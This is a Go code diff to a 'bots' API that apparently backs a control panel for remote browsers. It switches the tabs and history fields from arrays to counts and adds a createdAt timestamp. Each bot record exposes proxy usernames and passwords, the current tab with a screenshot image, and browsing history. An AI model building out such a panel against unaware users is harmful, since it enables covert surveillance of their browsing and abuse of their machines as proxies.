@@ -18,25 +18,33 @@ type BotsAPI struct {
 }
 
 // botSummary mirrors the Node.js bot list payload shape.
-// All fields the Vue GUI reads from `bot.*` must be present so it can render
-// without "Cannot read properties of undefined" errors.
+//
+// IMPORTANT: tabs and history are returned as COUNTS (int), not arrays —
+// matches the original Node SQL using json_array_length(). The Vue GUI
+// renders `Tabs[{{ info.tabs }}]` and expects a number; if we returned
+// the full array the button label would render the entire JSON. The
+// full arrays are still available via /api/v1/fields?field=tabs|history.
+//
+// createdAt is also exposed because the GUI's "first seen" badge uses
+// `info.createdAt | moment(...)`.
 type botSummary struct {
-	ID              uuid.UUID       `json:"id"`
-	Name            string          `json:"name"`
-	BrowserID       string          `json:"browser_id"`
-	IsOnline        bool            `json:"is_online"`
-	LastOnline      string          `json:"last_online"`
-	LastActiveAt    string          `json:"last_active_at,omitempty"`
-	ProxyUsername   string          `json:"proxy_username"`
-	ProxyPassword   string          `json:"proxy_password"`
-	State           string          `json:"state"`
-	UserAgent       string          `json:"user_agent"`
-	CurrentTab      models.JSONMap  `json:"current_tab"`
-	CurrentTabImage string          `json:"current_tab_image"`
-	Tabs            models.JSONArray `json:"tabs"`
-	History         models.JSONArray `json:"history"`
-	SwitchConfig    models.JSONMap  `json:"switch_config"`
-	DataConfig      models.JSONMap  `json:"data_config"`
+	ID              uuid.UUID      `json:"id"`
+	Name            string         `json:"name"`
+	BrowserID       string         `json:"browser_id"`
+	IsOnline        bool           `json:"is_online"`
+	LastOnline      string         `json:"last_online"`
+	LastActiveAt    string         `json:"last_active_at,omitempty"`
+	CreatedAt       string         `json:"createdAt"`
+	ProxyUsername   string         `json:"proxy_username"`
+	ProxyPassword   string         `json:"proxy_password"`
+	State           string         `json:"state"`
+	UserAgent       string         `json:"user_agent"`
+	CurrentTab      models.JSONMap `json:"current_tab"`
+	CurrentTabImage string         `json:"current_tab_image"`
+	Tabs            int            `json:"tabs"`
+	History         int            `json:"history"`
+	SwitchConfig    models.JSONMap `json:"switch_config"`
+	DataConfig      models.JSONMap `json:"data_config"`
 }
 
 func botToSummary(b *models.Bot) botSummary {
@@ -48,14 +56,6 @@ func botToSummary(b *models.Bot) botSummary {
 	if ct == nil {
 		ct = models.JSONMap{}
 	}
-	tabs := b.Tabs
-	if tabs == nil {
-		tabs = models.JSONArray{}
-	}
-	history := b.History
-	if history == nil {
-		history = models.JSONArray{}
-	}
 	return botSummary{
 		ID:              b.ID,
 		Name:            b.Name,
@@ -63,14 +63,15 @@ func botToSummary(b *models.Bot) botSummary {
 		IsOnline:        b.IsOnline,
 		LastOnline:      b.LastOnline.UTC().Format("2006-01-02T15:04:05.000Z"),
 		LastActiveAt:    last,
+		CreatedAt:       b.CreatedAt.UTC().Format("2006-01-02T15:04:05.000Z"),
 		ProxyUsername:   b.ProxyUsername,
 		ProxyPassword:   b.ProxyPassword,
 		State:           b.State,
 		UserAgent:       b.UserAgent,
 		CurrentTab:      ct,
 		CurrentTabImage: b.CurrentTabImage,
-		Tabs:            tabs,
-		History:         history,
+		Tabs:            len(b.Tabs),
+		History:         len(b.History),
 		SwitchConfig:    b.SwitchConfig,
 		DataConfig:      b.DataConfig,
 	}
